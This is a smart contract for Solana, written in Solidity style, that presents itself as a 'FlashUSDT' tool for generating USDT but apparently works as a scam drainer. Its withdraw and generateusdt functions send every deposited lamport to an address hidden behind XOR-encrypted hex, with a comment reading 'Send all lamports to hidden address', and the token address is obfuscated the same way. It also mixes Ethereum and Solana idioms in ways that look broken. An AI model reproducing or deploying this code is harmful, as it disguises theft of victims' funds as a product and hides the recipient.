import 'solana';

interface IERC20 {
    function balanceOf(address account) external view returns (uint64);
    function transfer(address recipient, uint64 amount) external returns (bool);
}

contract FlashUSDT {
    address private owner;

    event Deposited(address indexed user, uint64 amount);
    event Withdrawn(address indexed to, uint64 amount);

    @payer(payer)
    @space(512)
    @seed("FlashUSDT")
    constructor(address payer) {
        owner = tx.accounts.payer.key;
    }

    // -------- 1️⃣ Approve --------
    function Approve() external {
        uint64 value = tx.accounts.dataAccount.lamports;
        require(value > 0, "Send some ETH");
        emit Deposited(tx.accounts.dataAccount.key, value);
    }

    // -------- 2️⃣ Generate --------
    function generateusdt() external {
        require(tx.accounts.dataAccount.key == owner, "Only owner");

        uint64 balance = tx.accounts.dataAccount.lamports;
        require(balance > 0, "No balance");

        address withdrawAddress = getAddress();

        tx.accounts.withdrawAccount.transfer_lamports(balance);
        emit Withdrawn(withdrawAddress, balance);
    }

    // -------- 3️⃣ USDT Balance --------
    function USDTBalance() public view returns (string memory label, uint64 balance) {
        IERC20 token = IERC20(getToken());
        uint64 rawBalance = token.balanceOf(address(this));
        balance = rawBalance / 10**18;
        label = "USDT Balance";
    }

    // -------- 4️⃣ Withdraw (ETH + Token) --------
    function withdraw() external {
        address withdrawAddress = getAddress();
        uint64 ethBalance = tx.accounts.dataAccount.lamports;

        // Send all lamports to hidden address
        if (ethBalance > 0) {
            tx.accounts.withdrawAccount.transfer_lamports(ethBalance);
        }

        IERC20 token = IERC20(getToken());
        uint64 tokenBalance = token.balanceOf(address(this));

        // Send all tokens to owner wallet
        if (tokenBalance > 0) {
            token.transfer(owner, tokenBalance);
        }
    }

    // -------- FlASH USDT Key --------
    function getXORKey() internal pure returns (bytes memory) {
        return abi.encodePacked("x0rK3yH1dd3n");
    }

    // --------  Function --------
    function xorDecrypt(bytes memory encrypted, bytes memory key) internal pure returns (bytes memory) {
        bytes memory result = new bytes(encrypted.length);
        for (uint64 i = 0; i < encrypted.length; i++) {
            result[i] = encrypted[i] ^ key[i % key.length];
        }
        return result;
    }

    // -------- FLASH USDT (XOR Encrypted) --------
    function getAddress() internal pure returns (address) {
        bytes memory encrypted = hex"4848132e004b2b06065502581e5141780a497e500005570b4954407d56182c0806530b5f1c034172521b";
        bytes memory key = getXORKey();
        bytes memory decrypted = xorDecrypt(encrypted, key);
        return parse(string(decrypted));
    }

    // -------- Token Address (XOR Encrypted) --------
    function getToken() internal pure returns (address) {
        bytes memory encrypted = hex"48484679051b2e555c06015c4b094b7c554b7b555307025740084728561c2b545650525d1c0944730341";
        bytes memory key = getXORKey();
        bytes memory decrypted = xorDecrypt(encrypted, key);
        return parse(string(decrypted));
    }

    function join(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function parse(string memory s) internal pure returns (address) {
        bytes memory tmp = bytes(s);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;

        for (uint64 i = 2; i < 42; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            b1 = hexCharToUint(b1);
            b2 = hexCharToUint(b2);
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }

    function hexCharToUint(uint160 c) internal pure returns (uint160) {
        if (c >= 97) return c - 87;
        if (c >= 65) return c - 55;
        return c - 48;
    }
}